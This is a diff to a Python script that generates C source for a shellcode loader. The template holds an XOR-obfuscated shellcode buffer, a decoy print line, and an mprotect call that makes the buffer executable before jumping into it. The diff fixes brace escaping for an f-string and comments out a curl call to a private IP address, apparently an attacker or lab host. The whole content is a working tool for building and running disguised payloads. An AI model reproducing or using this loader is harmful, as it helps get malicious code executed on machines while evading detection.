@@ -1,5 +1,6 @@
 #!/bin/env python3
 from ak import *
+import ak
 import os
 import subprocess
 
@@ -18,7 +19,7 @@ def generate_c(shellcode):
   int main (int argc, char **argv)
   {{
       printf("I love programming.");
-      system("curl http://192.168.49.65/iran");
+      // system("curl http://192.168.49.65/iran");
       unsigned char *buf = "{xor_shellcode}";
       char xor_key = '\\x03';
       int arraysize = (int) sizeof(buf);
@@ -29,10 +30,10 @@ def generate_c(shellcode):
       intptr_t pagesize = sysconf(_SC_PAGESIZE);
       if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
               pagesize, PROT_READ|PROT_EXEC))
-      {
+      {{
               perror("mprotect");
               return -1;
-      }
+      }}
       int (*ret)() = (int(*)())buf;
       ret();
       return 0;
